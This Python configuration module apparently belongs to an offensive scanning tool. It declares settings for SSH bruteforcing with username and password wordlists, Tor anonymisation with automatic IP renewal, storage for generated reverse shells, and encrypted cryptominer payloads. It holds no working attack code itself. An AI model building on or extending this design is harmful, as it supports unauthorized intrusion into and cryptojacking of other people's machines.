import threading

# Global Variables for Hosts and Proxies
global_hosts = []  # Stores all loaded hosts
global_live_hosts = []  # Stores live hosts detected during testing
global_vulnerable_hosts = []  # Stores hosts identified as vulnerable
global_scraped_proxies = []  # Stores proxies before testing
global_tested_proxies = []  # Stores proxies after testing
global_active_sessions = []  # Stores active session details

# Global Configurations
global_config = {
    "tor_usage": False,
    "tor_enabled": False,  # Toggle Tor integration
    "tor_port": 9050,  # Default Tor SOCKS5 port
    "proxy_usage": True,  # Toggle proxy usage for scanning
    "scan_threads": 12,  # Default number of concurrent scanning threads
    "bruteforce_threads": 5,  # Default number of bruteforce threads
    "scan_timeout": 5,  # Default timeout for scanning connections
    "use_tor_renewal": True,  # Automatically renew Tor IP
    "tor_renewal_interval": 60,  # Interval in seconds for renewing Tor connection
}

# Global Variables for Payloads, Errors, and Logging
global_generated_payloads = []  # Stores generated reverse shells
global_error_log = []  # Stores error messages
global_scan_stats = {
    "valid": 0,
    "dead": 0,
    "remaining": 0,
    "total": 0,
}  # Stores scanning statistics
global_wordlist_paths = {
    "usernames": "wordlists/ssh_usernames.txt",
    "passwords": "wordlists/ssh_passwords.txt",
}  # Wordlist paths

# Thread-Safe Locks
lock = threading.Lock()

# Pause/Stop Events for Scanning Control
pause_event = threading.Event()
stop_event = threading.Event()

# Dynamic DNS Configuration (if used)
global_dynamic_dns = {
    "enabled": False,  # Enable or disable DDNS
    "ddns_provider": "",  # The DDNS provider API URL
    "ddns_domain": "",  # The domain used for dynamic resolution
}

# Tor Service Control
global_tor_status = {
    "running": False,  # Indicates whether Tor is running
    "last_renewed": None,  # Timestamp of last renewal
}

# Cryptominer Settings
global_cryptominer_config = {
    "enabled": False,  # Whether cryptominer payloads are enabled
    "encryption": True,  # Encrypt miner payloads before execution
}

# Logging Function
def log_error(message):
    """Log an error message into the global_error_log."""
    with lock:
        global_error_log.append(message)
        print(f"[ERROR] {message}")
